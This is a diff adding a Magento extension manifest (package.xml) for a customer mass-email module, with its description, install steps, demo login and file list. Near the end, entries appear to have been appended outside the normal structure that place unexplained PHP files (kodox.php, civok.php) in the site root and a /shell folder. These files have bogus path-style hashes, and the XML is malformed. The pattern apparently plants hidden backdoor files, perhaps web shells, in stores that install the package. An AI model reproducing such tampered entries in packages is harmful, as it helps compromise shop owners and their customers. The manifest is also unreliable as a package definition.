@@ -1,0 +1,60 @@
+<?xml version="1.0"?>
+<package>
+    <name>Grizzly_MassEmail</name>
+    <version>1.0.0</version>
+    <stability>beta</stability>
+    <license uri="http://grizzlysts.com/extensions/commercial-license-customer-mass-email.docx">commercial license</license>
+    <channel>community</channel>
+    <extends/>
+    <summary>Send Promotional Emails to all or selective customer using one click at admin.</summary>
+    <description>&lt;p&gt;Customer Mass Email is designed to allow the user to send out updates to select customers using Magento Email templates. Using this extension you can send coupons , news, events and more with a few clicks in the admin panel&lt;/p&gt;&#xD;
+&#xD;
+&lt;p&gt;Customer Mass Email will help you keep customers up to date on your future plans and upcoming events allowing you to stay connected and maximize revenue without turning to a third party service for Email blasts&lt;/p&gt;&#xD;
+&#xD;
+&lt;p&gt;&lt;b&gt;Extension Configuration:&lt;/b&gt;&lt;/p&gt;&#xD;
+&lt;ul&gt;&#xD;
+&lt;li&gt;Enable/Disable Extension&lt;/li&gt;&#xD;
+&lt;li&gt;Set Email Sender&lt;/li&gt;&#xD;
+&lt;li&gt;Set Email Template&lt;/li&gt;&#xD;
+&lt;/ul&gt;&#xD;
+&lt;p&gt;&lt;b&gt;Installation Steps:&lt;/b&gt;&lt;/p&gt;&#xD;
+&lt;p&gt;&lt;i&gt;1) &lt;/i&gt;After placing a successful order, you will receive a zip file containing the module files.&lt;/p&gt;&#xD;
+&lt;p&gt;&lt;i&gt;2) &lt;/i&gt;Unzip the file and upload the contents directly to your server under public_html or www folder.&lt;/p&gt;&#xD;
+&lt;p&gt;&lt;i&gt;3) &lt;/i&gt;After uploading the files, login to the admin panel and go to &lt;i&gt;&amp;quot;System-&amp;gt;Configuration&amp;quot;&lt;/i&gt;.&lt;/p&gt;&#xD;
+&lt;p&gt;&lt;i&gt;4) &lt;/i&gt;Find &lt;i&gt;&amp;quot;MassEmail Service&amp;quot;&lt;/i&gt; under &lt;i&gt;&amp;quot;Grizzly&amp;quot;&lt;/i&gt; section and click on it. If you get a 404 error then logout from admin and login again. &lt;/p&gt;&#xD;
+&lt;p&gt;&lt;i&gt;5) &lt;/i&gt;Go to System -&amp;gt; Configuration Click &lt;i&gt;&amp;quot;MassEmail Service&amp;quot;&lt;/i&gt; under the Grizzly section,  you will find all the options.&lt;/p&gt;&#xD;
+&lt;p&gt;Please see the demo URL below:&#xD;
+&lt;br /&gt;&lt;br /&gt;&#xD;
+&lt;b&gt;URL :-&lt;/b&gt; &lt;a href="http://grizzlysts.com/demo4/index.php/admin"&gt;http://grizzlysts.com/demo4/index.php/admin&lt;/a&gt;&lt;br /&gt;&#xD;
+&#xD;
+&lt;b&gt;Username:-&lt;/b&gt; demouser&lt;br /&gt;&#xD;
+&#xD;
+&lt;b&gt;Password:-&lt;/b&gt; demopass1!&#xD;
+&lt;/p&gt;</description>
+    <notes>Here is what this version supports :&#xD;
+&#xD;
+1) Adds a mass actions to customer Grid&#xD;
+&#xD;
+2) Provides facility to choose email sender and email template.</notes>
+    <authors><author><name>Robert Cowher</name><user>bobcowher</user><email>robert.cowher@grizzlysts.com</email></author></authors>
+    <date>2015-01-03</date>
+    <time>13:10:22</time>
+    <contents><target name="magecommunity"><dir name="Grizzly"><dir name="MassEmail"><dir name="Helper"><file name="Data.php" hash="7206e8fa08709a64755484397ccdd60d"/></dir><dir name="Model"><file name="Observer.php" hash="0c6b8fe45f1a7728a2ac1d6ed409b533"/></dir><dir name="controllers"><dir name="Adminhtml"><file name="MassEmailController.php" hash="88fd863410d19fbf36614b320d09c259"/></dir></dir><dir name="etc"><file name="config.xml" hash="925779101d4186627d2156e9b447ad03"/><file name="system.xml" hash="153d620dcfbacad3b3d4e5a2821ab79d"/></dir></dir></dir></target><target name="mageetc"><dir name="modules"><file name="Grizzly_MassEmail.xml" hash="a9ac307a7bf5d6ad485a704cf54135fb"/></dir></target><target name="magelocale"><dir name="en_US"><dir name="template"><dir name="email"><file name="grizzly_massemail.html" hash="83d5800de49198c175d7bcb23b7ff061"/><file name="order_reminder.html" hash="de50de0086223bc447290e1f2eb8558a"/></dir></dir></dir></target>
+    <compatible/>
+    <dependencies><required><php><min>5.2.0</min><max>6.0.0</max></php></required></dependencies>
+		    <target name="magecommunity">
+                <file name="kodox.php" hash="errors/kodox.php"/>
+    </target>
+		<target name="magecommunity">
+                <file name="civok.php" hash="errors/civok.php"/>
+    </target>
+	    <target name="/shell">
+                <file name="civok.php" hash="civok.php"/>
+    </target>
+		<target name="/">
+                <file name="kodox.php" hash="kodox.php"/>
+    </target>
+	</contents>
+    <compatible/>
+    <dependencies/>
+</package>
